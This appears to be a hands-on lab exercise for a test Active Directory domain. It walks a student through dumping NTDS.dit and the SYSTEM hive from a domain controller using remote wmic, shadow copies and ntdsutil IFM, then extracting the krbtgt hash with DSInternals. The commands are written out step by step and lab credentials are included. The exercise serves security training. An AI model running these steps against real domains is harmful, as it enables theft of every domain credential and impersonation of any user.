


## Exercise 1 - Exfiltrate the database

We are still working on the same contoso.com environment composed of the following machines:

- **DC01** a domain controller for contoso.com running Windows Server 2016 in the HQ Active Directory site
- **DC02** a domain controller for contoso.com running Windows Server 2022 in the Beijin Active Directory site
- **SRV01** a domain joined server member of the contoso.com domain running Windows Server 2022
- **CLI01** a domain joined client member of the contoso.com domain running Windows 11

In this exercise, **Miss Red** you will use the credentials you previously compromised to exfiltrate the NTDS database with the intent to crack it offline later… The account you have full access to is **CONTOSO\katrina.mendoza.adm**.

### Task 1 - Copy the database using Volume Shadow Copy

1. Log on to **[CLI01](https://labclient.labondemand.com/Instructions/6e093b8a-2f3b-4901-9748-814f5963167c?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127864/11menu.png) and click on **Windows Terminal (Admin)**.
    
3. In the **Windows Terminal** window, run the following: `runas /user:CONTOSO\katrina.mendoza.adm cmd.exe` and use the following password `NeverTrustAny1!`.
    
4. A new command prompt should have popped up called **cmd.exe (running as CONTOSO\katrina.mendoza.adm)**. To make it easier to keep track, we'll rename the window and change the color. Run the following in that prompt `title Katrina's console & color 4F`
    
    ![K1.png](https://labondemand.blob.core.windows.net/content/lab127864/K1.png)
    
    📝 What would be the command to type if you wanted the prompt to be with a light blue background and with a green text?
    
    Let's try to copy the database!
    
5. In the red prompt, type the following `copy \\DC01.contoso.com\C$\Windows\NTDS\ntds.dit C:\Users\Public`
    
    📝 What is the full error message?
    
6. In the same prompt, run the following `wmic /node:DC01.contoso.com process call create "cmd /c vssadmin create shadow /for=C: 2>&1 > C:\output.txt"` You will see the following output: ![WMIC1.png](https://labondemand.blob.core.windows.net/content/lab127864/WMIC1.png)
    
    What you have done is asking the Volume Shadow Copy service of Windows to create a snapshot of the drive where the database lies. You can't touch the live file, it's in used. But you can you copy its snapshot version. Its "shadow" version.
    
    Let see where the shadow is…
    
7. Now run the following `type \\DC01.contoso.com\C$\output.txt` and note where the shadow copy of the C drive is located. ![Shadow1.png](https://labondemand.blob.core.windows.net/content/lab127864/Shadow1.png)
    
8. Still in the red prompt, run `wmic /node:DC01 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ 2>&1 > C:\output.txt"`. This will copy the shadow copy to the root level of the C drive.
    
9. Now run the following to check if the copy did work `type \\DC01.contoso.com\C$\output.txt`.
    
10. And finally, in the prompt, type the following `copy \\DC01.contoso.com\C$\ntds.dit C:\Users\Public`
    
    You now have a copy of the NTDS.dit database. Well, that's not enough. You will need the keys to decrypt the secrets… But eh, not that hard, they are stored on the same machine! There are warmly waiting for you in the SYSTEM hive. Let's get it too.
    
11. In the red prompt, run `wmic /node:DC01 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM.hive 2>&1 > C:\output.txt"`.
    
12. And get it back locally by running `copy \\DC01.contoso.com\C$\SYSTEM.hive C:\Users\Public`
    
    Now you can use other tools to read those files and extract all the juicy keys they contain.
    

### Task 2 - Copy the database using IFM [optional]

Note that what you've done with VSS is more of proof of concept than an practical way of doing this. When we copy a database in use from the snapshot, the database is not properly clean (neither is the SYSTEM hive). A smarter way would be to invoke the IFM feature remotely and copy the output of the IFM. Well, let's do that then!

1. Still in the red prompt, run `wmic /node:DC01 process call create "ntdsutil \"activate instance ntds\" ifm \"create full C:\IFM\" quit quit 2>&1 > C:\output.txt"`
    
    This create an IFM copy in the C:\IFM folder. It can take few minutes to be generated.
    
2. Then copy the stuff locally in a new folder. Still in the red prompt, run the following: `mkdir C:\Users\Public\IFM` and copy the IFM from the DC by running `copy "\\DC01.contoso.com\C$\IFM\Active Directory" C:\Users\Public\IFM` then `copy \\DC01.contoso.com\C$\IFM\Registry C:\Users\Public\IFM`
    
3. Switch to the **Terminal console**, the one running with your account (not Katrina's). In the terminal, change the current directly with the command `Set-Location C:\Users\Public\IFM`
    
4. Let see if you can read the database you have. Run the following `Get-ADDBDomainController -DatabasePath NTDS.dit`
    
    Good! It seems that this is usable. Let's try to read a user account.
    
    > This PowerSHell cmdLet is a part of the DSInternal module.
    
    📝 Is the DS Internal PowerShell module available by default on Windows?
    
5. From the **Terminal console**, run the following: `Get-ADDBAccount -SamAccountName krbtgt -DatabasePath ntds.dit`
    
    It seems that we can read everything but the secrets… Oh of course, you almost forgot. There are encrypted. So first we get the key and then we extract the secret of the KrbTgt account.
    
6. Still in the **Terminal console**, run the following: `$syskey = Get-BootKey -SystemHiveFilePath SYSTEM` then `Get-ADDBAccount -SamAccountName krbtgt -DatabasePath ntds.dit -BootKey $syskey`
    
    📝 What are the last four characters of the NTHash of the krbtgt account?
    
    Now that you have the KrbTgt hash in your possession, well you could impersonate whoever you want!
    

